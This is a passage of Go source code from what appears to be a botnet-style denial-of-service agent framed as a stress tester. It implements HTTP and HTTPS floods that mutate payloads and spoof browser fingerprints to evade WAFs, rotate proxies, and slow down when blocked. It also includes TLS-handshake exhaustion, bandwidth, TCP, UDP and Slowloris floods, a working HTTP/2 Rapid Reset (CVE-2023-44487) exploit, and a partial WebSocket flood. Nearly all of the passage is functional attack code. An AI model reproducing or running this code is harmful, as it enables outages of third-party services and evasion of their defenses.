			var localCnt int64
			for {
				select {
				case <-ctx.Done():
					return
				default:
				}

				// 自适应节奏：每 128 次采样，仅高拦截率才减速
				adaptiveDelay(totalSent, totalBlocked, &localCnt)

				atomic.AddInt64(activeConn, 1)
				start := time.Now()

				// POST 载荷变异：每次请求 body 不同，避免 WAF 签名检测
				var bodyReader io.Reader
				bodyLen := 0
				if isBW {
					mutated := randomBodyPayload(nil, config.BodySize)
					bodyLen = len(mutated)
					bodyReader = bytes.NewReader(mutated)
				} else if bodyBytes != nil {
					mutated := randomBodyPayload(bodyBytes, 0)
					bodyLen = len(mutated)
					bodyReader = bytes.NewReader(mutated)
				}

				// URL 随机化（路径 + 查询参数）
				targetURL := randomizeURL(config.URL, paths, isCC)

				req, err := http.NewRequestWithContext(ctx, config.Method, targetURL, bodyReader)
				if err != nil {
					atomic.AddInt64(totalErrors, 1)
					atomic.AddInt64(totalSent, 1)
					atomic.AddInt64(activeConn, -1)
					continue
				}

				// 完整浏览器指纹（Sec-Ch-Ua / Sec-Fetch / Cookie / 多维度伪装）
				setBrowserHeaders(req, isCC)

				// 用户自定义头最后设置（可覆盖默认）
				for k, v := range config.Headers {
					req.Header.Set(k, v)
				}

				resp, err := client.Do(req)
				latency := time.Since(start).Nanoseconds()
				atomic.AddInt64(activeConn, -1)
				atomic.AddInt64(totalSent, 1)
				atomic.AddInt64(totalLatency, latency)
				atomic.AddInt64(bytesSent, int64(bodyLen+350))

				if err != nil {
					atomic.AddInt64(totalErrors, 1)
				} else {
					// 先读小块 body（用于 WAF 关键字检测，后续丢弃剩余）
					bodySnippet, _ := io.ReadAll(io.LimitReader(resp.Body, 2048))
					if isWAFBlocked(resp, bodySnippet) {
						atomic.AddInt64(totalBlocked, 1)
					}
					if config.KeepAlive {
						n, _ := io.CopyN(io.Discard, resp.Body, 4096)
						atomic.AddInt64(bytesRecv, n+int64(len(bodySnippet))+int64(300))
					} else {
						atomic.AddInt64(bytesRecv, int64(len(bodySnippet))+int64(300))
					}
					resp.Body.Close()
					atomic.AddInt64(totalSuccess, 1)
				}

				updateMinMax(minLat, maxLat, latency)
			}
		}()
	}
}

// ========== HTTPS 专用洪水模式 ==========
// 混合策略：HTTP/2 复用高 RPS + 新 TLS 连接耗尽服务端 CPU
func runHTTPSFlood(ctx context.Context, wg *sync.WaitGroup, config StressConfig,
	totalSent, totalSuccess, totalErrors, totalBlocked, totalLatency, minLat, maxLat, bytesSent, bytesRecv, activeConn *int64) {

	// 策略分配：70% HTTP/2 复用连接（高 RPS），30% 新 TLS 连接（耗 CPU）
	h2Workers := config.Concurrency * 7 / 10
	if h2Workers < 1 {
		h2Workers = 1
	}
	tlsWorkers := config.Concurrency - h2Workers
	if tlsWorkers < 1 {
		tlsWorkers = 1
	}

	isCC := config.Mode == "cc"
	var bodyBytes []byte
	if config.Body != "" {
		bodyBytes = []byte(config.Body)
	}

	paths := config.RandPaths
	if len(paths) == 0 && isCC {
		paths = defaultPaths
	}

	proxyRot := newProxyRotator(config.Proxies)
	if proxyRot.count > 0 {
		log.Printf("[HTTPS] 启用代理轮换: %d 个代理", proxyRot.count)
	}

	// Cookie 会话保持
	jar, _ := cookiejar.New(nil)

	log.Printf("[HTTPS] 启动: h2Workers=%d tlsWorkers=%d url=%s", h2Workers, tlsWorkers, config.URL)

	// ===== 策略1: HTTP/2 复用连接，高吞吐 =====
	h2Dialer := &net.Dialer{Timeout: 3 * time.Second, KeepAlive: 30 * time.Second}
	h2Transport := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
			ClientSessionCache: tls.NewLRUClientSessionCache(4096),
		},
		MaxIdleConns:          h2Workers + 100,
		MaxIdleConnsPerHost:   h2Workers,
		MaxConnsPerHost:       0,
		DisableKeepAlives:     false,
		DisableCompression:    true,
		IdleConnTimeout:       30 * time.Second,
		ResponseHeaderTimeout: 5 * time.Second,
		TLSHandshakeTimeout:   5 * time.Second,
		ForceAttemptHTTP2:     true,
		WriteBufferSize:       4 * 1024,
		ReadBufferSize:        4 * 1024,
		DialContext:           cachedDialContext(h2Dialer),
	}
	if proxyRot.count > 0 {
		h2Transport.Proxy = proxyRot.proxyFunc()
		h2Transport.DialContext = nil
	}
	h2Client := &http.Client{
		Timeout:   10 * time.Second,
		Transport: h2Transport,
		Jar:       jar,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	for i := 0; i < h2Workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			defer func() {
				if r := recover(); r != nil {
					log.Printf("[HTTPS-H2] worker panic: %v", r)
				}
			}()
			var localCnt int64
			for {
				select {
				case <-ctx.Done():
					return
				default:
				}

				adaptiveDelay(totalSent, totalBlocked, &localCnt)

				atomic.AddInt64(activeConn, 1)
				start := time.Now()

				var bodyReader io.Reader
				bodyLen := 0
				if bodyBytes != nil {
					mutated := randomBodyPayload(bodyBytes, 0)
					bodyLen = len(mutated)
					bodyReader = bytes.NewReader(mutated)
				}

				targetURL := randomizeURL(config.URL, paths, isCC)

				req, err := http.NewRequestWithContext(ctx, config.Method, targetURL, bodyReader)
				if err != nil {
					atomic.AddInt64(totalErrors, 1)
					atomic.AddInt64(totalSent, 1)
					atomic.AddInt64(activeConn, -1)
					continue
				}

				setBrowserHeaders(req, isCC)
				for k, v := range config.Headers {
					req.Header.Set(k, v)
				}

				resp, err := h2Client.Do(req)
				latency := time.Since(start).Nanoseconds()
				atomic.AddInt64(activeConn, -1)
				atomic.AddInt64(totalSent, 1)
				atomic.AddInt64(totalLatency, latency)
				atomic.AddInt64(bytesSent, int64(bodyLen+350))

				if err != nil {
					atomic.AddInt64(totalErrors, 1)
				} else {
					bodySnippet, _ := io.ReadAll(io.LimitReader(resp.Body, 2048))
					if isWAFBlocked(resp, bodySnippet) {
						atomic.AddInt64(totalBlocked, 1)
					}
					n, _ := io.CopyN(io.Discard, resp.Body, 4096)
					resp.Body.Close()
					atomic.AddInt64(bytesRecv, n+int64(len(bodySnippet))+int64(300))
					atomic.AddInt64(totalSuccess, 1)
				}
				updateMinMax(minLat, maxLat, latency)
			}
		}()
	}

	// ===== 策略2: 每次新建 TLS 连接（不复用），耗尽服务端 TLS 握手资源 =====
	tlsFreshDialer := &net.Dialer{Timeout: 3 * time.Second}
	for i := 0; i < tlsWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			defer func() {
				if r := recover(); r != nil {
					log.Printf("[HTTPS-TLS] worker panic: %v", r)
				}
			}()
			var localCnt int64
			for {
				select {
				case <-ctx.Done():
					return
				default:
				}

				adaptiveDelay(totalSent, totalBlocked, &localCnt)

				freshTransport := &http.Transport{
					TLSClientConfig: &tls.Config{
						InsecureSkipVerify: true,
					},
					DisableKeepAlives:     true,
					DisableCompression:    true,
					ResponseHeaderTimeout: 5 * time.Second,
					TLSHandshakeTimeout:   5 * time.Second,
					ForceAttemptHTTP2:     true,
					DialContext:           cachedDialContext(tlsFreshDialer),
				}
				if proxyRot.count > 0 {
					freshTransport.Proxy = proxyRot.proxyFunc()
					freshTransport.DialContext = nil
				} else {
					freshTransport.DialTLSContext = utlsDialTLSContext(tlsFreshDialer)
					freshTransport.TLSClientConfig = nil
					freshTransport.ForceAttemptHTTP2 = false
				}
				freshClient := &http.Client{
					Timeout:   8 * time.Second,
					Transport: freshTransport,
					Jar:       jar,
					CheckRedirect: func(req *http.Request, via []*http.Request) error {
						return http.ErrUseLastResponse
					},
				}

				atomic.AddInt64(activeConn, 1)
				start := time.Now()

				targetURL := randomizeURL(config.URL, paths, isCC)

				req, err := http.NewRequestWithContext(ctx, config.Method, targetURL, nil)
				if err != nil {
					atomic.AddInt64(totalErrors, 1)
					atomic.AddInt64(totalSent, 1)
					atomic.AddInt64(activeConn, -1)
					freshTransport.CloseIdleConnections()
					continue
				}

				setBrowserHeaders(req, isCC)
				for k, v := range config.Headers {
					req.Header.Set(k, v)
				}

				resp, err := freshClient.Do(req)
				latency := time.Since(start).Nanoseconds()
				atomic.AddInt64(activeConn, -1)
				atomic.AddInt64(totalSent, 1)
				atomic.AddInt64(totalLatency, latency)
				atomic.AddInt64(bytesSent, int64(350))

				if err != nil {
					atomic.AddInt64(totalErrors, 1)
				} else {
					bodySnippet, _ := io.ReadAll(io.LimitReader(resp.Body, 2048))
					if isWAFBlocked(resp, bodySnippet) {
						atomic.AddInt64(totalBlocked, 1)
					}
					n, _ := io.CopyN(io.Discard, resp.Body, 4096)
					resp.Body.Close()
					atomic.AddInt64(bytesRecv, n+int64(len(bodySnippet))+int64(300))
					atomic.AddInt64(totalSuccess, 1)
				}

				freshTransport.CloseIdleConnections()
				updateMinMax(minLat, maxLat, latency)
			}
		}()
	}
}

// ========== 带宽洪水模式 ==========
func runBandwidthFlood(ctx context.Context, wg *sync.WaitGroup, config StressConfig,
	totalSent, totalSuccess, totalErrors, totalLatency, minLat, maxLat, bytesSent, bytesRecv, activeConn *int64) {

	// 生成大 payload（预分配，所有 goroutine 共享只读）
	payloadSize := config.BodySize * 1024
	if payloadSize > 10*1024*1024 {
		payloadSize = 10 * 1024 * 1024
	}
	if payloadSize < 1024 {
		payloadSize = 64 * 1024
	}
	payload := make([]byte, payloadSize)
	rand.Read(payload)

	isHTTPS := strings.HasPrefix(strings.ToLower(config.URL), "https://")
	// HTTPS 强制开启 KeepAlive，避免每次请求都做 TLS 握手
	keepAlive := config.KeepAlive || isHTTPS
	dialer := &net.Dialer{Timeout: 3 * time.Second, KeepAlive: 30 * time.Second}
	tlsCfg := &tls.Config{
		InsecureSkipVerify: true,
		ClientSessionCache: tls.NewLRUClientSessionCache(2048),
	}
	transport := &http.Transport{
		TLSClientConfig:       tlsCfg,
		MaxIdleConns:          config.Concurrency + 100,
		MaxIdleConnsPerHost:   config.Concurrency,
		MaxConnsPerHost:       0,
		DisableKeepAlives:     !keepAlive,
		DisableCompression:    true,
		IdleConnTimeout:       30 * time.Second,
		ResponseHeaderTimeout: 10 * time.Second,
		TLSHandshakeTimeout:   5 * time.Second,
		ForceAttemptHTTP2:     isHTTPS,
		WriteBufferSize:       64 * 1024, // 带宽模式用大写缓冲
		ReadBufferSize:        4 * 1024,
		DialContext:           cachedDialContext(dialer),
	}
	client := &http.Client{
		Timeout:   15 * time.Second,
		Transport: transport,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	// 随机 boundary 用于伪装 multipart 上传
	boundary := "----WebKitFormBoundary" + randStr(16)
	contentType := "multipart/form-data; boundary=" + boundary

	log.Printf("[Bandwidth] 启动: url=%s isHTTPS=%v keepAlive=%v payload=%dKB concurrency=%d",
		config.URL, isHTTPS, keepAlive, payloadSize/1024, config.Concurrency)

	for i := 0; i < config.Concurrency; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			defer func() {
				if r := recover(); r != nil {
					log.Printf("[Bandwidth] worker panic: %v", r)
				}
			}()
			for {
				select {
				case <-ctx.Done():
					return
				default:
				}

				atomic.AddInt64(activeConn, 1)
				start := time.Now()

				req, err := http.NewRequestWithContext(ctx, "POST", config.URL, bytes.NewReader(payload))
				if err != nil {
					atomic.AddInt64(totalErrors, 1)
					atomic.AddInt64(totalSent, 1)
					atomic.AddInt64(activeConn, -1)
					continue
				}
				req.Header.Set("Content-Type", contentType)
				req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
				req.Header.Set("Accept", "*/*")
				req.Header.Set("Accept-Encoding", "gzip, deflate, br")
				req.Header.Set("Origin", config.URL)
				req.Header.Set("Referer", config.URL)

				resp, err := client.Do(req)
				latency := time.Since(start).Nanoseconds()
				atomic.AddInt64(activeConn, -1)
				atomic.AddInt64(totalSent, 1)
				atomic.AddInt64(totalLatency, latency)

				if err != nil {
					atomic.AddInt64(totalErrors, 1)
				} else {
					atomic.AddInt64(bytesSent, int64(payloadSize+400))
					n, _ := io.CopyN(io.Discard, resp.Body, 4096)
					resp.Body.Close()
					atomic.AddInt64(bytesRecv, n+int64(300))
					atomic.AddInt64(totalSuccess, 1)
				}

				updateMinMax(minLat, maxLat, latency)
			}
		}()
	}
}

// ========== TCP 连接洪水（自动适配 HTTPS/TLS）==========
func runTCPFlood(ctx context.Context, wg *sync.WaitGroup, config StressConfig,
	totalSent, totalSuccess, totalErrors, totalLatency, minLat, maxLat, bytesSent, bytesRecv, activeConn *int64) {

	isHTTPS := strings.HasPrefix(strings.ToLower(config.URL), "https://")

	// 从 URL 提取 host:port
	target := config.URL
	target = strings.TrimPrefix(target, "http://")
	target = strings.TrimPrefix(target, "https://")
	if idx := strings.Index(target, "/"); idx != -1 {
		target = target[:idx]
	}
	if !strings.Contains(target, ":") {
		if isHTTPS {
			target += ":443"
		} else {
			target += ":80"
		}
	}

	dialer := &net.Dialer{Timeout: 3 * time.Second}
	sessionCache := tls.NewLRUClientSessionCache(4096)

	hostOnly := strings.Split(target, ":")[0]
	// 每次连接生成随机请求头，避免固定指纹被识别
	buildHTTPReq := func() []byte {
		return []byte(fmt.Sprintf("GET /?%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n",
			randStr(8), hostOnly, userAgents[rand.Intn(len(userAgents))]))
	}

	// 连接建立函数：HTTPS 用 TLS（带超时），HTTP 用普通 TCP
	dialConn := func() (net.Conn, error) {
		tcpConn, err := dialer.DialContext(ctx, "tcp", target)
		if err != nil {
			return nil, err
		}
		if isHTTPS {
			tlsConn := tls.Client(tcpConn, &tls.Config{
				InsecureSkipVerify: true,
				ServerName:         hostOnly,
				ClientSessionCache: sessionCache,
			})
			// 给 TLS 握手单独设 5 秒超时，防止无限挂起
			hsCtx, hsCancel := context.WithTimeout(ctx, 5*time.Second)
			defer hsCancel()
			if err := tlsConn.HandshakeContext(hsCtx); err != nil {
				tcpConn.Close()
				return nil, err
			}
			return tlsConn, nil
		}
		return tcpConn, nil
	}

	// 一半 goroutine 做快速连接（SYN/TLS 洪水），一半做 Slowloris（占位）
	halfConc := config.Concurrency / 2
	if halfConc < 1 {
		halfConc = 1
	}

	log.Printf("[TCP] 启动: target=%s isHTTPS=%v fast=%d slow=%d", target, isHTTPS, halfConc, config.Concurrency-halfConc)

	// 快速连接模式：建连 -> 发随机数据 -> 立即关闭
	for i := 0; i < halfConc; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			defer func() {
				if r := recover(); r != nil {
					log.Printf("[TCP-Fast] worker panic: %v", r)
				}
			}()
			for {
				select {
				case <-ctx.Done():
					return
				default:
				}

				atomic.AddInt64(activeConn, 1)
				start := time.Now()

				conn, err := dialConn()
				latency := time.Since(start).Nanoseconds()
				atomic.AddInt64(totalSent, 1)
				atomic.AddInt64(totalLatency, latency)

				if err != nil {
					atomic.AddInt64(totalErrors, 1)
					atomic.AddInt64(activeConn, -1)
				} else {
					atomic.AddInt64(totalSuccess, 1)
					n, _ := conn.Write(buildHTTPReq())
					atomic.AddInt64(bytesSent, int64(n))
					conn.Close()
					atomic.AddInt64(activeConn, -1)
				}

				updateMinMax(minLat, maxLat, latency)
			}
		}()
	}

	// Slowloris 模式：建连后缓慢发送数据，长期占用服务端连接
	for i := 0; i < config.Concurrency-halfConc; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			defer func() {
				if r := recover(); r != nil {
					log.Printf("[TCP-Slow] worker panic: %v", r)
				}
			}()
			for {
				select {
				case <-ctx.Done():
					return
				default:
				}

				atomic.AddInt64(activeConn, 1)
				start := time.Now()

				conn, err := dialConn()
				latency := time.Since(start).Nanoseconds()
				atomic.AddInt64(totalSent, 1)
				atomic.AddInt64(totalLatency, latency)

				if err != nil {
					atomic.AddInt64(totalErrors, 1)
					atomic.AddInt64(activeConn, -1)
					updateMinMax(minLat, maxLat, latency)
					continue
				}

				atomic.AddInt64(totalSuccess, 1)
				header := fmt.Sprintf("GET /?%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n",
					randStr(8), hostOnly, userAgents[rand.Intn(len(userAgents))])
				conn.Write([]byte(header))
				atomic.AddInt64(bytesSent, int64(len(header)))

				// 用 ticker 代替 time.After 防止 timer 泄漏，3秒间隔更紧凑
				kaTicker := time.NewTicker(3 * time.Second)
				for j := 0; j < 20; j++ {
					select {
					case <-ctx.Done():
						kaTicker.Stop()
						conn.Close()
						atomic.AddInt64(activeConn, -1)
						return
					case <-kaTicker.C:
						line := fmt.Sprintf("X-a-%s: %s\r\n", randStr(4), randStr(8))
						_, err := conn.Write([]byte(line))
						if err != nil {
							break
						}
						atomic.AddInt64(bytesSent, int64(len(line)))
					}
				}
				kaTicker.Stop()
				conn.Close()
				atomic.AddInt64(activeConn, -1)
				updateMinMax(minLat, maxLat, latency)
			}
		}()
	}
}

// ========== UDP 洪水模式（无握手，纯带宽消耗）==========
func runUDPFlood(ctx context.Context, wg *sync.WaitGroup, config StressConfig,
	totalSent, totalSuccess, totalErrors, totalLatency, minLat, maxLat, bytesSent, bytesRecv, activeConn *int64) {

	// 从 URL 提取 host:port
	target := config.URL
	target = strings.TrimPrefix(target, "http://")
	target = strings.TrimPrefix(target, "https://")
	if idx := strings.Index(target, "/"); idx != -1 {
		target = target[:idx]
	}
	if !strings.Contains(target, ":") {
		target += ":80"
	}

	// 构造 payload，UDP 单包上限 65507，常用 MTU 安全值 1400
	payloadSize := config.BodySize * 1024
	if payloadSize <= 0 {
		payloadSize = 1400
	}
	if payloadSize > 65507 {
		payloadSize = 65507
	}
	payload := make([]byte, payloadSize)
	rand.Read(payload)

	log.Printf("[UDP] 启动: target=%s payload=%dB concurrency=%d", target, payloadSize, config.Concurrency)

	for i := 0; i < config.Concurrency; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			defer func() {
				if r := recover(); r != nil {
					log.Printf("[UDP] worker panic: %v", r)
				}
			}()

			// 每个 worker 独立 UDP 连接（无握手，立即可用）
			conn, err := net.DialTimeout("udp", target, 3*time.Second)
			if err != nil {
				log.Printf("[UDP] dial failed: %v", err)
				atomic.AddInt64(totalErrors, 1)
				return
			}
			defer conn.Close()
			atomic.AddInt64(activeConn, 1)
			defer atomic.AddInt64(activeConn, -1)

			for {
				select {
				case <-ctx.Done():
					return
				default:
				}

				start := time.Now()
				n, err := conn.Write(payload)
				latency := time.Since(start).Nanoseconds()

				atomic.AddInt64(totalSent, 1)
				atomic.AddInt64(totalLatency, latency)

				if err != nil {
					atomic.AddInt64(totalErrors, 1)
					// UDP "连接"断开，重建
					conn.Close()
					atomic.AddInt64(activeConn, -1)
					conn, err = net.DialTimeout("udp", target, 3*time.Second)
					if err != nil {
						return
					}
					atomic.AddInt64(activeConn, 1)
				} else {
					atomic.AddInt64(totalSuccess, 1)
					atomic.AddInt64(bytesSent, int64(n))
				}

				updateMinMax(minLat, maxLat, latency)
			}
		}()
	}
}

// ========== Slowloris 独立模式（低带宽占满连接池）==========
// 专注用最少带宽占满目标 MaxConnections，配合其他模式使用效果最佳
func runSlowloris(ctx context.Context, wg *sync.WaitGroup, config StressConfig,
	totalSent, totalSuccess, totalErrors, totalLatency, minLat, maxLat, bytesSent, bytesRecv, activeConn *int64) {

	isHTTPS := strings.HasPrefix(strings.ToLower(config.URL), "https://")

	target := config.URL
	target = strings.TrimPrefix(target, "http://")
	target = strings.TrimPrefix(target, "https://")
	if idx := strings.Index(target, "/"); idx != -1 {
		target = target[:idx]
	}
	if !strings.Contains(target, ":") {
		if isHTTPS {
			target += ":443"
		} else {
			target += ":80"
		}
	}

	dialer := &net.Dialer{Timeout: 5 * time.Second}
	sessionCache := tls.NewLRUClientSessionCache(2048)
	hostOnly := strings.Split(target, ":")[0]

	dialConn := func() (net.Conn, error) {
		tcpConn, err := dialer.DialContext(ctx, "tcp", target)
		if err != nil {
			return nil, err
		}
		if isHTTPS {
			tlsConn := tls.Client(tcpConn, &tls.Config{
				InsecureSkipVerify: true,
				ServerName:         hostOnly,
				ClientSessionCache: sessionCache,
			})
			hsCtx, hsCancel := context.WithTimeout(ctx, 5*time.Second)
			defer hsCancel()
			if err := tlsConn.HandshakeContext(hsCtx); err != nil {
				tcpConn.Close()
				return nil, err
			}
			return tlsConn, nil
		}
		return tcpConn, nil
	}

	log.Printf("[Slowloris] 启动: target=%s isHTTPS=%v concurrency=%d", target, isHTTPS, config.Concurrency)

	// 全部 worker 都做 Slowloris（不分快慢），最大化占位
	for i := 0; i < config.Concurrency; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			defer func() {
				if r := recover(); r != nil {
					log.Printf("[Slowloris] worker panic: %v", r)
				}
			}()
			for {
				select {
				case <-ctx.Done():
					return
				default:
				}

				atomic.AddInt64(activeConn, 1)
				start := time.Now()

				conn, err := dialConn()
				latency := time.Since(start).Nanoseconds()
				atomic.AddInt64(totalSent, 1)
				atomic.AddInt64(totalLatency, latency)

				if err != nil {
					atomic.AddInt64(totalErrors, 1)
					atomic.AddInt64(activeConn, -1)
					updateMinMax(minLat, maxLat, latency)
					// 建连失败短暂退避，避免疯狂重试浪费 CPU
					time.Sleep(100 * time.Millisecond)
					continue
				}

				atomic.AddInt64(totalSuccess, 1)
				// 发送不完整 HTTP 头
				header := fmt.Sprintf("GET /?%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept-Language: en-US,en;q=0.5\r\n",
					randStr(8), hostOnly, userAgents[rand.Intn(len(userAgents))])
				conn.Write([]byte(header))
				atomic.AddInt64(bytesSent, int64(len(header)))

				// 每 3 秒发一个额外头保持连接活跃，持续 60 秒
				kaTicker := time.NewTicker(3 * time.Second)
				for j := 0; j < 20; j++ {
					select {
					case <-ctx.Done():
						kaTicker.Stop()
						conn.Close()
						atomic.AddInt64(activeConn, -1)
						return
					case <-kaTicker.C:
						line := fmt.Sprintf("X-%s: %s\r\n", randStr(6), randStr(12))
						_, werr := conn.Write([]byte(line))
						if werr != nil {
							break
						}
						atomic.AddInt64(bytesSent, int64(len(line)))
					}
				}
				kaTicker.Stop()
				conn.Close()
				atomic.AddInt64(activeConn, -1)
				updateMinMax(minLat, maxLat, latency)
			}
		}()
	}
}

// ========== 辅助函数 ==========

func updateMinMax(minLat, maxLat *int64, latency int64) {
	for {
		cur := atomic.LoadInt64(minLat)
		if latency >= cur || atomic.CompareAndSwapInt64(minLat, cur, latency) {
			break
		}
	}
	for {
		cur := atomic.LoadInt64(maxLat)
		if latency <= cur || atomic.CompareAndSwapInt64(maxLat, cur, latency) {
			break
		}
	}
}

func makeProgress(sent int64, totalSuccess, totalErrors, totalBlocked, totalLatency, minLat, maxLat *int64,
	rps float64, bs, br int64, mbpsSent, mbpsRecv float64, activeConn *int64, running bool) StressProgress {

	avgLat := float64(0)
	if sent > 0 {
		avgLat = float64(atomic.LoadInt64(totalLatency)) / float64(sent) / 1e6
	}
	minL := float64(atomic.LoadInt64(minLat)) / 1e6
	maxL := float64(atomic.LoadInt64(maxLat)) / 1e6
	if minL > 1e9 {
		minL = 0
	}

	return StressProgress{
		Sent:       sent,
		Success:    atomic.LoadInt64(totalSuccess),
		Errors:     atomic.LoadInt64(totalErrors),
		Blocked:    atomic.LoadInt64(totalBlocked),
		RPS:        round2(rps),
		AvgLatency: round2(avgLat),
		MinLatency: round2(minL),
		MaxLatency: round2(maxL),
		BytesSent:  bs,
		BytesRecv:  br,
		MbpsSent:   round2(mbpsSent),
		MbpsRecv:   round2(mbpsRecv),
		ActiveConn: atomic.LoadInt64(activeConn),
		Running:    running,
	}
}

func sendStressMsg(conn *websocket.Conn, writeMu *sync.Mutex, msgType, taskID string, progress StressProgress) {
	payload, _ := json.Marshal(progress)
	msg, _ := json.Marshal(AgentMessage{
		Type:    msgType,
		ID:      taskID,
		Payload: payload,
	})
	writeMu.Lock()
	err := conn.WriteMessage(websocket.TextMessage, msg)
	writeMu.Unlock()
	if err != nil {
		log.Printf("[Stress] WS 上报失败(%s): %v", msgType, err)
	}
}

// ========== HTTP/2 Rapid Reset (CVE-2023-44487) ==========
// 原理：单连接内快速开流+RST取消，耗尽服务端每流处理资源，每秒数万请求仅需1个TCP
func runH2RapidReset(ctx context.Context, wg *sync.WaitGroup, config StressConfig,
	totalSent, totalSuccess, totalErrors, totalBlocked, totalLatency, minLat, maxLat, bytesSent, bytesRecv, activeConn *int64) {

	u, err := url.Parse(config.URL)
	if err != nil {
		log.Printf("[H2-Reset] URL 解析失败: %v", err)
		return
	}
	host := u.Hostname()
	port := u.Port()
	if port == "" {
		if u.Scheme == "https" {
			port = "443"
		} else {
			port = "80"
		}
	}
	addr := host + ":" + port
	path := u.Path
	if path == "" {
		path = "/"
	}
	if u.RawQuery != "" {
		path += "?" + u.RawQuery
	}
	isTLS := u.Scheme == "https"
	scheme := u.Scheme

	log.Printf("[H2-Reset] 启动: target=%s workers=%d", addr, config.Concurrency)

	for i := 0; i < config.Concurrency; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()
			defer func() {
				if r := recover(); r != nil {
					log.Printf("[H2-Reset] worker panic: %v", r)
				}
			}()

			var localCnt int64
			for {
				select {
				case <-ctx.Done():
					return
				default:
				}

				adaptiveDelay(totalSent, totalBlocked, &localCnt)

				// 建立新连接
				var conn net.Conn
				dialer := &net.Dialer{Timeout: 3 * time.Second}
				if isTLS {
					tlsConfig := &tls.Config{
						ServerName:         host,
						InsecureSkipVerify: true,
						NextProtos:         []string{"h2"},
					}
					conn, err = tls.DialWithDialer(dialer, "tcp", addr, tlsConfig)
					if err == nil {
						if tlsConn, ok := conn.(*tls.Conn); ok {
							if tlsConn.ConnectionState().NegotiatedProtocol != "h2" {
								conn.Close()
								atomic.AddInt64(totalErrors, 1)
								atomic.AddInt64(totalSent, 1)
								time.Sleep(50 * time.Millisecond)
								continue
							}
						}
					}
				} else {
					conn, err = dialer.Dial("tcp", addr)
				}
				if err != nil {
					atomic.AddInt64(totalErrors, 1)
					atomic.AddInt64(totalSent, 1)
					time.Sleep(50 * time.Millisecond)
					continue
				}

				atomic.AddInt64(activeConn, 1)
				conn.SetDeadline(time.Now().Add(15 * time.Second))

				// HTTP/2 preface
				if _, err := conn.Write([]byte("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")); err != nil {
					conn.Close()
					atomic.AddInt64(activeConn, -1)
					atomic.AddInt64(totalErrors, 1)
					atomic.AddInt64(totalSent, 1)
					continue
				}

				framer := http2.NewFramer(conn, conn)
				// 初始 SETTINGS
				_ = framer.WriteSettings(
					http2.Setting{ID: http2.SettingInitialWindowSize, Val: 65535},
					http2.Setting{ID: http2.SettingMaxFrameSize, Val: 16384},
				)
				_ = framer.WriteWindowUpdate(0, 1<<20)

				var hpackBuf bytes.Buffer
				hpackEncoder := hpack.NewEncoder(&hpackBuf)

				streamID := uint32(1)
				connStart := time.Now()
				// 本连接内发射 RST 风暴，最多 5000 条流或 10 秒
				for j := 0; j < 5000; j++ {
					if time.Since(connStart) > 10*time.Second {
						break
					}
					select {
					case <-ctx.Done():
						conn.Close()
						atomic.AddInt64(activeConn, -1)
						return
					default:
					}

					hpackBuf.Reset()
					hpackEncoder.WriteField(hpack.HeaderField{Name: ":method", Value: "GET"})
					hpackEncoder.WriteField(hpack.HeaderField{Name: ":scheme", Value: scheme})
					hpackEncoder.WriteField(hpack.HeaderField{Name: ":authority", Value: host})
					hpackEncoder.WriteField(hpack.HeaderField{Name: ":path", Value: randomizeURL(path, config.RandPaths, false)})
					hpackEncoder.WriteField(hpack.HeaderField{Name: "user-agent", Value: userAgents[rand.Intn(len(userAgents))]})
					hpackEncoder.WriteField(hpack.HeaderField{Name: "accept", Value: "*/*"})

					start := time.Now()
					err := framer.WriteHeaders(http2.HeadersFrameParam{
						StreamID:      streamID,
						BlockFragment: hpackBuf.Bytes(),
						EndStream:     true,
						EndHeaders:    true,
					})
					if err != nil {
						break
					}
					// 立即 RST_STREAM —— 核心攻击动作
					if err := framer.WriteRSTStream(streamID, http2.ErrCodeCancel); err != nil {
						break
					}

					latency := time.Since(start).Nanoseconds()
					atomic.AddInt64(totalSent, 1)
					atomic.AddInt64(totalSuccess, 1)
					atomic.AddInt64(totalLatency, latency)
					atomic.AddInt64(bytesSent, int64(hpackBuf.Len()+27))
					updateMinMax(minLat, maxLat, latency)

					streamID += 2
					if streamID > 2147483647 {
						break
					}
				}
				conn.Close()
				atomic.AddInt64(activeConn, -1)
			}
		}(i)
	}
}

// ========== WebSocket Flood ==========
// 建立大量 WebSocket 连接并持续发送帧，耗尽服务端长连接资源和消息处理能力
func runWebSocketFlood(ctx context.Context, wg *sync.WaitGroup, config StressConfig,
	totalSent, totalSuccess, totalErrors, totalLatency, minLat, maxLat, bytesSent, bytesRecv, activeConn *int64) {

	u, err := url.Parse(config.URL)
	if err != nil {
		log.Printf("[WS] URL 解析失败: %v", err)
		return
	}
	// 自动将 http/https 转为 ws/wss
	switch u.Scheme {
	case "http":
		u.Scheme = "ws"
	case "https":
		u.Scheme = "wss"
	}
	wsURL := u.String()
	log.Printf("[WS] 启动: target=%s workers=%d", wsURL, config.Concurrency)

	headers := http.Header{}
	headers.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
	headers.Set("Origin", u.Scheme+"://"+u.Host)
	for k, v := range config.Headers {
		headers.Set(k, v)
	}

	dialer := websocket.Dialer{
		HandshakeTimeout: 5 * time.Second,
		TLSClientConfig:  &tls.Config{InsecureSkipVerify: true},
	}

	for i := 0; i < config.Concurrency; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			defer func() {
				if r := recover(); r != nil {
					log.Printf("[WS] worker panic: %v", r)
				}
			}()

			for {
				select {
				case <-ctx.Done():
					return
				default:
				}

				start := time.Now()
				c, _, err := dialer.DialContext(ctx, wsURL, headers)
				if err != nil {
